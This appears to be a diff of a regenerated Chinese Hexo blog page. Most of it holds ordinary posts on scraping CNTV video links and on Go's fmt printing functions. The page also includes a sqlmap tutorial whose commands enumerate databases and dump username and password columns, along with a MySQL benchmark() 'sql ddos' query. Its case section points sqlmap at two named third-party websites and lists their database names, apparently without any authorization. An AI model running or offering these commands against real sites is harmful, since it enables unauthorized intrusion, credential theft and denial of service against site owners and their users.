class="string">    :param api_url:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    r = requests.get(api_url).text</span><br><span class="line">    hls_url = json.loads(r)[<span class="string">'hls_url'</span>]</span><br><span class="line">    <span class="keyword">return</span> hls_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> tree.xpath(<span class="string">"//h3//a"</span>):</span><br><span class="line">    title = a.text.split(<span class="string">" "</span>)[<span class="number">1</span>]</span><br><span class="line">    vid = a.attrib[<span class="string">'href'</span>].replace(<span class="string">'/video/C31718/'</span>, <span class="string">''</span>)</span><br><span class="line">    hls_url = get_vinfo(<span class="string">'http://vdn.apps.cntv.cn/api/getHttpVideoInfo.do?pid=&#123;vid&#125;'</span>.format(vid=vid))</span><br><span class="line">    print(<span class="string">'&#123;0:&#123;1&#125;&lt;10&#125; &#123;2&#125;  &#123;3&#125;'</span>.format(title, chr(<span class="number">12288</span>), vid, hls_url))</span><br></pre></td></tr></table></figure>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 狮子王</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">    <span class="string">&#x27;http://tv.cntv.cn/index.php?action=videoset-videolistbytype&amp;class=jiemu&amp;page=&#123;page&#125;&amp;setid=C31718&amp;istiyu=0&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        page=i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">url = urls[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">r = requests.get(url).text</span><br><span class="line"></span><br><span class="line">tree = html.fromstring(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_vinfo</span>(<span class="params">api_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取hls地址</span></span><br><span class="line"><span class="string">    :param api_url:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    r = requests.get(api_url).text</span><br><span class="line">    hls_url = json.loads(r)[<span class="string">&#x27;hls_url&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> hls_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> tree.xpath(<span class="string">&quot;//h3//a&quot;</span>):</span><br><span class="line">    title = a.text.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    vid = a.attrib[<span class="string">&#x27;href&#x27;</span>].replace(<span class="string">&#x27;/video/C31718/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    hls_url = get_vinfo(<span class="string">&#x27;http://vdn.apps.cntv.cn/api/getHttpVideoInfo.do?pid=&#123;vid&#125;&#x27;</span>.<span class="built_in">format</span>(vid=vid))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;0:&#123;1&#125;&lt;10&#125; &#123;2&#125;  &#123;3&#125;&#x27;</span>.<span class="built_in">format</span>(title, <span class="built_in">chr</span>(<span class="number">12288</span>), vid, hls_url))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
       
 
@@ -760,7 +847,7 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/16/golang/golang-print-detail/" class="archive-article-date">
   	<time datetime="2019-08-16T14:21:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-16</time>
-  	更新：2025-09-30
+  	更新：2019-08-16
 </a>
         
       </header>
@@ -776,7 +863,7 @@ var _hmt = _hmt || [];
 </ul>
 <p><strong>Integer</strong></p>
 <ul>
-<li><code>%+d</code>带符号的整型，fmt.Printf(“%+d”,255)// +255</li>
+<li><code>%+d</code>带符号的整型，fmt.Printf(“%+d”,255)&#x2F;&#x2F; +255</li>
 <li><code>%q</code>打印单引号</li>
 <li><code>%o</code>不带零的八进制</li>
 <li><code>%#o</code>带零的八进制</li>
@@ -858,7 +945,7 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/14/golang/golang-print/" class="archive-article-date">
   	<time datetime="2019-08-14T11:04:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
-  	更新：2025-09-30
+  	更新：2019-08-14
 </a>
         
       </header>
@@ -867,23 +954,28 @@ var _hmt = _hmt || [];
       
         <p><strong>基础打印</strong></p>
 <p>以默认格式输出到标准输出。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message := <span class="string">"Hello World"</span>;</span><br><span class="line">fmt.Print(message)</span><br><span class="line">fmt.Println(message)</span><br></pre></td></tr></table></figure>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message := <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">fmt.Print(message)</span><br><span class="line">fmt.Println(message)</span><br></pre></td></tr></table></figure>
+
 <p><strong>F前缀</strong></p>
 <p><code>Fprint()</code>, <code>Fprintf()</code>,<code>Fprintln()</code></p>
 <p>您可以为开头带有“f”的对象显式指定写入目标。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message := <span class="string">"Hello World"</span>;</span><br><span class="line">fmt.Fprint(os.Stdout, message)</span><br><span class="line">fmt.Fprintln(os.Stdout, message)</span><br><span class="line">fmt.Fprintf(os.Stdout, <span class="string">"%T"</span>, message)</span><br></pre></td></tr></table></figure>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message := <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">fmt.Fprint(os.Stdout, message)</span><br><span class="line">fmt.Fprintln(os.Stdout, message)</span><br><span class="line">fmt.Fprintf(os.Stdout, <span class="string">&quot;%T&quot;</span>, message)</span><br></pre></td></tr></table></figure>
+
 <p><strong>S前缀</strong></p>
 <p><code>Sprint()</code>, <code>Sprintf()</code>,<code>Sprintln()</code></p>
 <p>开头带有“s”的将格式化结果返回为字符串，而不是输出。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message := <span class="string">"Hello World"</span>;</span><br><span class="line">message = fmt.Sprint(message)</span><br><span class="line">fmt.Println(message)</span><br></pre></td></tr></table></figure>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message := <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">message = fmt.Sprint(message)</span><br><span class="line">fmt.Println(message)</span><br></pre></td></tr></table></figure>
+
 <p><strong>F后缀</strong></p>
 <p><code>Printf()</code>, <code>Fprintf()</code>,<code>Sprintf()</code></p>
 <p>如果格式后跟“f”，则可以指定格式。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Printf(<span class="string">"%v"</span>, message)</span><br><span class="line">fmt.Fprintf(os.Stdout, <span class="string">"%v"</span>, message)</span><br><span class="line">message3 := fmt.Sprintf(<span class="string">"%v"</span>, message)</span><br><span class="line">fmt.Println(message3)</span><br></pre></td></tr></table></figure>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Printf(<span class="string">&quot;%v&quot;</span>, message)</span><br><span class="line">fmt.Fprintf(os.Stdout, <span class="string">&quot;%v&quot;</span>, message)</span><br><span class="line">message3 := fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, message)</span><br><span class="line">fmt.Println(message3)</span><br></pre></td></tr></table></figure>
+
 <p><strong>ln后缀</strong></p>
 <p><code>Println()</code>, <code>Fprintln()</code>,<code>Sprintln()</code></p>
 <p>对于后面带有“ln”的操作数，操作数之间有一个空格，在字符串的末尾添加新行。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="string">"Hello"</span>, <span class="string">"World"</span>)</span><br><span class="line">fmt.Fprintln(os.Stdout, <span class="string">"Hello"</span>, <span class="string">"World"</span>)</span><br><span class="line">message4 :=fmt.Sprintln(<span class="string">"Hello"</span>, <span class="string">"World"</span>)</span><br><span class="line">fmt.Println(message4)</span><br></pre></td></tr></table></figure>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>)</span><br><span class="line">fmt.Fprintln(os.Stdout, <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>)</span><br><span class="line">message4 :=fmt.Sprintln(<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>)</span><br><span class="line">fmt.Println(message4)</span><br></pre></td></tr></table></figure>
+
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>F前缀 可以指定输出目的</p>
 <p>S前缀 可以返回String结果</p>
 <p>f后缀 可以格式化输出</p>
@@ -957,7 +1049,7 @@ var _hmt = _hmt || [];
         
         <a href="/2019/08/13/sqlmap-in-action-01/" class="archive-article-date">
   	<time datetime="2019-08-13T10:14:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-13</time>
-  	更新：2025-09-30
+  	更新：2019-08-13
 </a>
         
       </header>
@@ -965,26 +1057,42 @@ var _hmt = _hmt || [];
     <div class="article-entry" itemprop="articleBody">
       
         <p><strong>检测注入点</strong></p>
-<p><code>GET注入</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5</span><br></pre></td></tr></table></figure></p>
+<p><code>GET注入</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5</span><br></pre></td></tr></table></figure>
+
 <p><code>POST注入</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --data=&quot;username=admin&quot; --batch --random-agent --delay=0.5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --data=&quot;username=admin&quot; --batch --random-agent --delay=0.5</span><br></pre></td></tr></table></figure>
+
 <p><strong>查询目标存在的数据库</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --dbs</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --dbs</span><br></pre></td></tr></table></figure>
+
 <p><strong>查询指定数据库的表</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --tables -D sql_inject</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --tables -D sql_inject</span><br></pre></td></tr></table></figure>
+
 <p><strong>查询表结构</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --columns -T users -D sql_inject</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --columns -T users -D sql_inject</span><br></pre></td></tr></table></figure>
+
 <p><strong>查询表数据</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --dump -C &quot;id,username, password&quot; -T users -D sql_inject  --batch</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --dump -C &quot;id,username, password&quot; -T users -D sql_inject  --batch</span><br></pre></td></tr></table></figure>
+
 <p><strong>枚举当前用户</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --current-db --current-user --hostname --is-dba</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --current-db --current-user --hostname --is-dba</span><br></pre></td></tr></table></figure>
+
 <p><strong>清除缓存</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --flush-session --fresh-queries</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --flush-session --batch</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --flush-session --fresh-queries</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --flush-session --batch</span><br></pre></td></tr></table></figure>
+
 <p><strong>注入详情</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; -v 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; -v 1</span><br></pre></td></tr></table></figure>
+
 <p><strong>sql ddos</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</span><br></pre></td></tr></table></figure>
-<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://www.asfaa.org/members.php?id=1</span><br><span class="line">http://www.katoombagroup.org/details.php?id=56</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://www.asfaa.org/members.php?id=1&quot;  --current-db</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --tables -D db83231_asfaa</span><br><span class="line"></span><br><span class="line"> python sqlmap.py -u &quot;http://www.katoombagroup.org/details.php?id=56&quot; --batch --random-agent --delay=0.5</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://www.katoombagroup.org/details.php?id=56&quot; --batch --random-agent --delay=0.5 --tables -D katoomba_LearningTools</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://www.asfaa.org/members.php?id=1</span><br><span class="line">http://www.katoombagroup.org/details.php?id=56</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://www.asfaa.org/members.php?id=1&quot;  --current-db</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;https://sl.ngrok.spring-cloud.tk/users?username=admin&quot; --batch --random-agent --delay=0.5 --tables -D db83231_asfaa</span><br><span class="line"></span><br><span class="line"> python sqlmap.py -u &quot;http://www.katoombagroup.org/details.php?id=56&quot; --batch --random-agent --delay=0.5</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://www.katoombagroup.org/details.php?id=56&quot; --batch --random-agent --delay=0.5 --tables -D katoomba_LearningTools</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
       
 
@@ -1040,97 +1148,9 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-php/laravel/laravel-error" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/php/laravel/laravel-error/">laravel常见错误</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/08/php/laravel/laravel-error/" class="archive-article-date">
-  	<time datetime="2019-08-08T15:49:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-  	更新：2025-09-30
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建了新的laravel项目后, 运行提示:No application encryption key has been specified</span><br><span class="line">解决方法:</span><br><span class="line">这个是由于没有配置好 APP_KEY</span><br><span class="line">在终端上, cd到项目目录位置然后执行:</span><br><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">laravel</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      <span id="busuanzi_container_page_pv">
-        |阅读量(<span id="busuanzi_value_page_pv"></span>)
-      </span>
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/php//" class="article-tag-list-link color4">php</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/08/php/laravel/laravel-error/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/14/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><a class="page-number" href="/page/17/">17</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><a class="extend next" rel="next" href="/page/16/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/14/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><a class="page-number" href="/page/17/">17</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/16/">Next &raquo;</a>
     </nav>
   
 
@@ -1142,7 +1162,7 @@ var _hmt = _hmt || [];
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2025 Niu Yuxian
+    		&copy; 2026 Niu Yuxian
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -1267,15 +1287,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">was</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">area</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">cors</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">was</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1303,10 +1323,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">c#</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Nord</a>
               </li>
              
@@ -1324,6 +1340,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">guqin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">c#</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1395,6 +1415,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">opencv</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">原码</a>
               </li>
              
@@ -1415,10 +1439,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">ruby</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">sed</a>
               </li>
              
@@ -1436,6 +1456,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">sts</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">ruby</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1483,10 +1507,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">zookeeper</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">archlinux</a>
               </li>
              
@@ -1503,6 +1523,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">zookeeper</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">d365</a>
               </li>
              
@@ -1511,15 +1535,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">deno</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">docker alpine</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">razor</a>
+                <a href="javascript:void(0)" class="js-tag color5">deno</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1528,6 +1548,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">ffmpeg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">razor</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1615,14 +1639,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">mq</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">rocketmq</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">nginx</a>
               </li>
              
@@ -1640,6 +1656,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">mq</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">rocketmq</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1667,15 +1691,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">regex</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">requests</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">rust</a>
+                <a href="javascript:void(0)" class="js-tag color1">regex</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1687,11 +1707,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">wechat</a>
